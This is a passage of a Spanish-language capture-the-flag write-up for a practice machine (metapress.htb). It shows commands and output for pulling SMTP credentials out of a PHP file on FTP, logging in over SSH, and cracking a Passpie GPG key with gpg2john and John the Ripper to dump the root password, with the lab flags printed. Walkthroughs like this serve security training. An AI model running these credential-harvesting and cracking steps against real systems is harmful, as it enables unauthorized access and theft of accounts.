```

Dentro del directorio mailer en el servidor FTP encontré el archivo send_email.php, que descargué para su análisis:
```bash
ftp> cd mailer
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||37290|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5  2022 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
226 Transfer complete
ftp> get send_email.php
local: send_email.php remote: send_email.php
229 Entering Extended Passive Mode (|||29535|)
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
100% |********************************************************************************************************************|  1126        5.55 KiB/s    00:00 ETA
226 Transfer complete
1126 bytes received in 00:00 (1.25 KiB/s)
```

En el archivo send_email.php descargado del FTP dentro del directorio mailer se encontraron credenciales:
```bash
❯ catn send_email.php
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
```

### Captura flag usuario
Utilizando las credenciales encontradas en el archivo send_email.php, específicamente el usuario jnelson@metapress.htb y la contraseña Cb4_JmWM8zUZWMu@Ys, logré establecer una conexión exitosa por SSH al sistema, accediendo como el usuario jnelson y obteniendo así acceso directo a la máquina objetivo.
```
❯ ssh jnelson@metapress.htb
jnelson@metapress.htb's password: 
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jun 29 12:13:44 2025 from 10.10.14.13
jnelson@meta2:~$ 
```

```bash
jnelson@meta2:~$ ls
user.txt
jnelson@meta2:~$ cat user.txt
8159b4f96b52a658662affdf43e7c7ae
jnelson@meta2:~$ 
```

### Captura flag root
Tras obtener acceso como el usuario jnelson, listé los archivos en su directorio personal y observé un directorio .passpie que contenía archivos relacionados con un gestor de contraseñas (.config, .keys y una carpeta ssh). Esto sugiere que el usuario utiliza Passpie para gestionar credenciales, lo cual podría ser útil para una escalada de privilegios o enumeración de contraseñas almacenadas.
```bash
jnelson@meta2:~$ ls -la
total 32
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25  2022 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 Jun 29 10:27 user.txt
jnelson@meta2:~$ cd .passpie
jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25  2022 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 ssh
```

Extraje el contenido de .keys para convertirlo a un formato crackeable mediante gpg2john. Posteriormente, utilicé John the Ripper, logrando descifrar la contraseña del archivo GPG: blink182. Esto revela la clave maestra del almacén de Passpie y abre la posibilidad de enumerar y utilizar credenciales almacenadas por el usuario.
```bash
❯ gpg2john key > crack
❯ john --wordlist=/usr/share/wordlists/rockyou.txt crack
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:06 DONE (2025-06-30 02:31) 0.1579g/s 25.90p/s 25.90c/s 25.90C/s peanut..blink182
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
jnelson@meta2:~/.passpie$ passpie
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
jnelson@meta2:~/.passpie$ passpie --help
Usage: passpie [OPTIONS] COMMAND [ARGS]...

Options:
  -D, --database TEXT  Database path or url to remote repository
  --autopull TEXT      Autopull changes from remote pository
  --autopush TEXT      Autopush changes to remote pository
  --config PATH        Path to configuration file
  -v, --verbose        Activate verbose output
  --version            Show the version and exit.
  --help               Show this message and exit.

Commands:
  add       Add new credential to database
  complete  Generate completion scripts for shells
  config    Show current configuration for shell
  copy      Copy credential password to clipboard/stdout
  export    Export credentials in plain text
  import    Import credentials from path
  init      Initialize new passpie database
  list      Print credential as a table
  log       Shows passpie database changes history
  purge     Remove all credentials from database
  remove    Remove credential
  reset     Renew passpie database and re-encrypt...
  search    Search credentials by regular expressions
  status    Diagnose database for improvements
  update    Update credential
```

Obteniendo la frase secreta blink182 utilicé el comando passpie copy --passphrase blink182 --to stdout root@ssh para revelar la contraseña del usuario root, logrando así escalar privilegios en el sistema.
```bash
jnelson@meta2:~/.passpie$ passpie copy --passphrase blink182 --to stdout root@ssh
p7qfAZt4_A1xo_0x
```

```bash
jnelson@meta2:~/.passpie$ su root
Password: 
root@meta2:/home/jnelson/.passpie# cd
root@meta2:~# ls
restore  root.txt
root@meta2:~# cat root.txt
03f37bc3da01ba6dbb976919f2960e86
```
